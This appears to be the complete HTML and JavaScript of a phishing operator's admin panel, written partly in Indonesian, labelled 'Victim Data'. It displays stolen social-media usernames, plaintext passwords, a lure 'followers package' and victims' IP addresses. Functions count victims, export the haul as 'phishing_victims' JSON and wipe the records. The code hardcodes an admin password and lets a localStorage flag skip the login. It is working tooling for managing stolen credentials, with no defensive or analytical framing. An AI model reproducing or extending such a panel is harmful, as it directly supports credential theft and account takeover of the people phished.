<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Victim Data</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: 'Courier New', monospace;
            padding: 20px;
            color: #e4e4e7;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            text-align: center;
            padding: 20px;
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #ff0000;
        }
        .header h1 { color: #ff0000; font-size: 24px; }
        .login-box {
            max-width: 400px;
            margin: 100px auto;
            background: #1a1a2e;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #ff0000;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #0a0a0f;
            border: 1px solid #333;
            color: #00ff41;
            border-radius: 5px;
        }
        .login-box button {
            background: #ff0000;
            color: white;
            border: none;
            padding: 12px 30px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #1a1a2e;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #00ff41;
        }
        .stat-number { font-size: 32px; font-weight: bold; color: #00ff41; }
        .stat-label { color: #888; font-size: 12px; }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #1a1a2e;
            border-radius: 10px;
            overflow: hidden;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
            font-size: 12px;
        }
        th { background: #ff0000; color: white; }
        .clear-btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .refresh-btn {
            background: #00aa33;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            margin-bottom: 20px;
            margin-left: 10px;
        }
        .export-btn {
            background: #0095f6;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            margin-bottom: 20px;
            margin-left: 10px;
        }
        .status { color: #00ff41; margin-left: 20px; }
        .error { color: #ff4444; }
        pre { white-space: pre-wrap; word-break: break-all; max-width: 300px; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="header">
        <h1>🔐 ADMIN PANEL - VICTIM DATA 🔐</h1>
        <p>Teguh ganteng</p>
    </div>

    <div id="loginSection" class="login-box">
        <h2 style="margin-bottom: 20px;">Admin Login</h2>
        <input type="password" id="adminPass" placeholder="Enter password">
        <button onclick="login()">LOGIN</button>
        <div id="loginError" style="color:#ff4444; margin-top:10px;"></div>
    </div>

    <div id="dashboardSection" style="display:none;">
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalVictims">0</div>
                <div class="stat-label">Total Victims</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="todayVictims">0</div>
                <div class="stat-label">Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="lastVictim">-</div>
                <div class="stat-label">Last Victim</div>
            </div>
        </div>
        
        <div style="margin-bottom: 20px;">
            <button class="refresh-btn" onclick="loadData()">🔄 REFRESH</button>
            <button class="export-btn" onclick="exportData()">📥 EXPORT JSON</button>
            <button class="clear-btn" onclick="clearData()">🗑️ CLEAR ALL DATA</button>
            <span id="statusMsg" class="status"></span>
        </div>

        <div style="overflow-x: auto;">
            <table id="dataTable">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Followers Package</th>
                        <th>IP Address</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr><td colspan="6" style="text-align:center;">Loading data...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    let currentData = [];

    async function login() {
        const password = document.getElementById('adminPass').value;
        const errorDiv = document.getElementById('loginError');
        
        if (!password) {
            errorDiv.textContent = 'Masukkan password!';
            return;
        }
        
        try {
            const res = await fetch('/api/admin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: password })
            });
            const data = await res.json();
            
            if (data.success) {
                document.getElementById('loginSection').style.display = 'none';
                document.getElementById('dashboardSection').style.display = 'block';
                loadData();
            } else {
                errorDiv.textContent = data.message || 'Password salah!';
            }
        } catch (err) {
            errorDiv.textContent = 'Error: ' + err.message;
        }
    }

    async function loadData() {
        const statusMsg = document.getElementById('statusMsg');
        statusMsg.textContent = 'Loading...';
        
        try {
            const res = await fetch('/api/get-data', {
                headers: { 'x-admin-pass': '083183' }
            });
            const data = await res.json();
            
            if (data.success) {
                currentData = data.data;
                updateTable();
                updateStats();
                statusMsg.textContent = `✅ Last updated: ${new Date().toLocaleTimeString()}`;
            } else {
                statusMsg.textContent = '❌ Gagal load data';
            }
        } catch (err) {
            statusMsg.textContent = '❌ Error: ' + err.message;
        }
    }

    function updateTable() {
        const tbody = document.getElementById('tableBody');
        
        if (currentData.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No victims yet...</td></tr>';
            return;
        }
        
        tbody.innerHTML = currentData.map(victim => `
            <tr>
                <td>${victim.id}</td>
                <td><strong>${escapeHtml(victim.username)}</strong></td>
                <td><span style="color:#ffaa00;">${escapeHtml(victim.password)}</span></td>
                <td>${victim.followers}</td>
                <td><code>${victim.ip}</code></td>
                <td>${victim.timestamp}</td>
            </tr>
        `).join('');
    }

    function updateStats() {
        document.getElementById('totalVictims').textContent = currentData.length;
        
        const today = new Date().toDateString();
        const todayCount = currentData.filter(v => {
            const victimDate = new Date(v.timestamp).toDateString();
            return victimDate === today;
        }).length;
        document.getElementById('todayVictims').textContent = todayCount;
        
        if (currentData.length > 0) {
            const last = currentData[0];
            document.getElementById('lastVictim').textContent = last.username;
        } else {
            document.getElementById('lastVictim').textContent = '-';
        }
    }

    async function clearData() {
        if (confirm('⚠️ Yakin ingin menghapus SEMUA data korban? Data akan hilang permanen!')) {
            try {
                const res = await fetch('/api/clear-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: '083183' })
                });
                const data = await res.json();
                
                if (data.success) {
                    alert('✅ Semua data berhasil dihapus!');
                    loadData();
                } else {
                    alert('❌ Gagal hapus data: ' + data.message);
                }
            } catch (err) {
                alert('Error: ' + err.message);
            }
        }
    }

    function exportData() {
        const dataStr = JSON.stringify(currentData, null, 2);
        const blob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `phishing_victims_${new Date().toISOString().slice(0,19)}.json`;
        a.click();
        URL.revokeObjectURL(url);
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Cek apakah sudah login (by localStorage)
    if (localStorage.getItem('adminLoggedIn') === 'true') {
        document.getElementById('loginSection').style.display = 'none';
        document.getElementById('dashboardSection').style.display = 'block';
        loadData();
    }
</script>
</body>
</html>
